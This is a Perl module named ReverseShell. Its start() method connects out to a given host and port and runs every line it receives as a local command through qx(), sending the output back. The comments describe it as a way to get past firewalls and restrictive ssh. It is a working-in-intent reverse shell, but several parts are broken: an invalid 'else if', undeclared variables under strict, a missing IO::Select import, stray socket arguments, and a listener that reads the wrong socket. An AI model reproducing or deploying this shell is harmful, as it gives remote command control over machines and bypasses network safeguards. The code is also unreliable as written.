# ----------------------------------
# class ReverseShell
# Description:
#    Listen to a tcp port and interpret anything as a command 
#    to be executed locally.
#    This can be used where there is no ssh deamon running
#    or the ssh deamon is restrictive
#    Inspired by http://www.plenz.com/reverseshell
#    use(for example)
#    netcat -v -l -p $self->{port}
#    on the other end to connect
#    Then call start on the machine behind the firewall
#    to connect to the netcat
#-----------------------------------
# Methods:
# new() :
#-----------------------------------


package ReverseShell;
use strict;
use IO::Socket;
1;

sub new {
    my $class=shift;
    my $self={};
    $self->{port}=shift;
    $self->{host}=shift;
    bless $self, $class;
    return $self;
}

# to be called bu host behind the firewall
# interpret any input as a command and execute it.
sub start {
    my $self=shift;
    my $sock = new IO::Socket::INET ( PeerAddr => $self->{host}, 
                                      PeerPort => $self->{port}, 
                                      Proto => 'tcp', 6 ); 
    die "Could not create socket: $!\n" unless $sock; 
    select $sock;$|=1;
    while(defined($l=<$sock>)){print qx($l);}
    close($sock);
}

# to be called by the client
sub listen {
    my $self=shift;
    my $stdout=shift || \*STDOUT;
    my $stdin=shift || \*STDIN;
    my $sock = new IO::Socket::INET ( 
        LocalHost => '127.0.0.1', 
        LocalPort => $self->{port}, 
        Proto => 'tcp',
        Listen => 1,
        Reuse => 1, 8 ); 
    die "Could not create socket: $!\n" unless $sock;
    my $new_sock = $sock->accept();
    my $sel=IO::Select->new();;
    $sel->add( $stdin );
    $sel->add( $sock );
    my @ready;
    while(@ready = $sel->can_read() ) {
       foreach $fh (@ready) {
           if( $fh == $stdin ) {
                print $sock <$fh>;
           }
           else if( $fh == $sock ) {
                print $stdout <$sock>;
           }
           else {
                $sel->remove($sock); 
                $sel->remove($stdin); 
                close($$sock); 
           }
       }
    }
    close($sock)
}
